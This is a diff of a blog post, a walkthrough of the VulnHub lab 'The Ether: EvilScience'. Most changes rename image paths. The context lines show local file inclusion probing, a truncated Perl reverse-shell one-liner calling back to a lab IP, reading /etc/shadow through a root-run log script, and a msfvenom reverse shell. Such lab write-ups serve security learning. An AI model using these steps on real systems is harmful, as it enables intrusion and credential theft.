@@ -1,6 +1,6 @@
 ---
 layout: post
-last_modified_at: 2018-06-07 17:06:14 +0000
+last_modified_at: 2018-06-17 15:42:49 +0000
 title: "The Ether: EvilScience Walkthrough"
 category: Walkthrough
 tags: [VulnHub, "The Ether"]
@@ -40,8 +40,8 @@ PORT   STATE SERVICE REASON         VERSION
 
 As usual, let's start with the web service. This is how the site looks like in my browser.
 
-![landing page](/assets/images/posts/evilscience-walkthrough/evilscience-1.png){: style="display: block"}
-![landing page](/assets/images/posts/evilscience-walkthrough/evilscience-3.png){: style="display: block"}
+![landing page](/assets/images/posts/the-ether-evilscience-walkthrough/evilscience-1.png){: style="display: block"}
+![landing page](/assets/images/posts/the-ether-evilscience-walkthrough/evilscience-3.png){: style="display: block"}
 
 Let's use `curl` and some `grep`-fu to see if there are any hyperlinks that I can work with.
 
@@ -73,7 +73,7 @@ A hint of LFI vulnerability? Who knows?
 
 Let's fuzz the site with `dirbuster` and see what we get.
 
-![dirbuster](/assets/images/posts/evilscience-walkthrough/evilscience-2.png)
+![dirbuster](/assets/images/posts/the-ether-evilscience-walkthrough/evilscience-2.png)
 
 ```
 Dir found: / - 200
@@ -109,9 +109,9 @@ I try the following common LFI attacks with no success:
 
 I have success displaying the content of `/usr/share/apache2/icons/README`.
 
-![README](/assets/images/posts/evilscience-walkthrough/evilscience-5.png)
+![README](/assets/images/posts/the-ether-evilscience-walkthrough/evilscience-5.png)
 
-![README](/assets/images/posts/evilscience-walkthrough/evilscience-6.png)
+![README](/assets/images/posts/the-ether-evilscience-walkthrough/evilscience-6.png)
 
 The parameter allows absolute path in the URL but some kind of filtering for common LFI attacks is in place. The [**DocumentRoot**][4] is also not at the usual `/var/www/html`. :sweat:
 
@@ -166,11 +166,11 @@ Now, let's give `fuzz.sh` a shot.
 
 OK. The script is working — `/?file=../public_html/about.php` gives me the confidence.
 
-![fuzz.sh](/assets/images/posts/evilscience-walkthrough/evilscience-4.png)
+![fuzz.sh](/assets/images/posts/the-ether-evilscience-walkthrough/evilscience-4.png)
 
 Moving up the next level got me stuck for hours. Not knowing how to move forward, I chance upon **theether.com** at the footer.
 
-![theether.com](/assets/images/posts/evilscience-walkthrough/evilscience-7.png)
+![theether.com](/assets/images/posts/the-ether-evilscience-walkthrough/evilscience-7.png)
 
 Using that as base, I created a custom wordlist with `python`.
 
@@ -204,7 +204,7 @@ Using the custom wordlist with `fuzz.sh`, I'm able to map out the next level.
 
 At long last. the **DocumentRoot** is at `/var/www/html/theEther.com/public_html`.
 
-![docroot](/assets/images/posts/evilscience-walkthrough/evilscience-8.png)
+![docroot](/assets/images/posts/the-ether-evilscience-walkthrough/evilscience-8.png)
 
 Sweet.
 
@@ -329,7 +329,7 @@ perl -e 'use Socket;$i="192.168.198.128";$p=80;socket(S,PF_INET,SOCK_STREAM,getp
 
 To avoid complications, it's best to `urlencode()` the above and then spawn a pseudo-tty for optimal output control.
 
-![shell](/assets/images/posts/evilscience-walkthrough/evilscience-9.png)
+![shell](/assets/images/posts/the-ether-evilscience-walkthrough/evilscience-9.png)
 
 I have shell.
 
@@ -337,35 +337,35 @@ I have shell.
 
 I notice that user `evilscience` is able to `sudo` as `root`.
 
-![sudo](/assets/images/posts/evilscience-walkthrough/evilscience-10.png)
+![sudo](/assets/images/posts/the-ether-evilscience-walkthrough/evilscience-10.png)
 
 There's also a file with the `setuid` and `setgid` bit turned on. Notice the file size on this guy? 11MB for a Python file? Something funky is going on here.
 
-![xxxlogauditorxxx.py](/assets/images/posts/evilscience-walkthrough/evilscience-11.png)
+![xxxlogauditorxxx.py](/assets/images/posts/the-ether-evilscience-walkthrough/evilscience-11.png)
 
 `www-data` has some pretty interesting permissions going on as well.
 
-![sudo](/assets/images/posts/evilscience-walkthrough/evilscience-12.png)
+![sudo](/assets/images/posts/the-ether-evilscience-walkthrough/evilscience-12.png)
 
 In any case, let's run `xxxlogauditorxxx.py` and see what I'm up against.
 
-![xxxlogauditorxxx.py](/assets/images/posts/evilscience-walkthrough/evilscience-13.png)
+![xxxlogauditorxxx.py](/assets/images/posts/the-ether-evilscience-walkthrough/evilscience-13.png)
 
 It appears to be displaying the content of the chosen log file.
 
 _For `/var/log/auth.log`_
 
-![auth.log](/assets/images/posts/evilscience-walkthrough/evilscience-15.png)
+![auth.log](/assets/images/posts/the-ether-evilscience-walkthrough/evilscience-15.png)
 
 _For `/var/log/apache2/access.log`_
 
-![access.log](/assets/images/posts/evilscience-walkthrough/evilscience-14.png)
+![access.log](/assets/images/posts/the-ether-evilscience-walkthrough/evilscience-14.png)
 
 It uses `cat` to display the content of the files. Recall from above that `www-data` is able to run `xxxlogauditorxxx.py` as `root` without password?
 
 Armed with this new knowledge, let's see if we can display `/etc/shadow` along with `/var/log/auth.log`.
 
-![shadow](/assets/images/posts/evilscience-walkthrough/evilscience-16.png)
+![shadow](/assets/images/posts/the-ether-evilscience-walkthrough/evilscience-16.png)
 
 Holy smoke. It works.
 
@@ -377,15 +377,15 @@ cat /var/log/auth.log /etc/shadow
 
 Perhaps I can use command substitution with backticks to execute another command as `root`? First, let's generate a single-stage reverse shell with `msfvenom` and transfer it over.
 
-![msfvenom](/assets/images/posts/evilscience-walkthrough/evilscience-17.png)
+![msfvenom](/assets/images/posts/the-ether-evilscience-walkthrough/evilscience-17.png)
 
-![nc](/assets/images/posts/evilscience-walkthrough/evilscience-18.png)
+![nc](/assets/images/posts/the-ether-evilscience-walkthrough/evilscience-18.png)
 
 Time to test my hypothesis.
 
-![xxxlogauditorxxx.py](/assets/images/posts/evilscience-walkthrough/evilscience-21.png)
+![xxxlogauditorxxx.py](/assets/images/posts/the-ether-evilscience-walkthrough/evilscience-21.png)
 
-![root](/assets/images/posts/evilscience-walkthrough/evilscience-19.png)
+![root](/assets/images/posts/the-ether-evilscience-walkthrough/evilscience-19.png)
 
 :dancer:
 
@@ -393,11 +393,11 @@ Time to test my hypothesis.
 
 There's a PNG file `flag.png` in `/root` that looks like this.
 
-![flag.png](/assets/images/posts/evilscience-walkthrough/flag.png)
+![flag.png](/assets/images/posts/the-ether-evilscience-walkthrough/flag.png)
 
 A long `base64` encoded string appends to the end of the file.
 
-![base64](/assets/images/posts/evilscience-walkthrough/evilscience-20.png)
+![base64](/assets/images/posts/the-ether-evilscience-walkthrough/evilscience-20.png)
 
 The cat is now out of the bag.
 
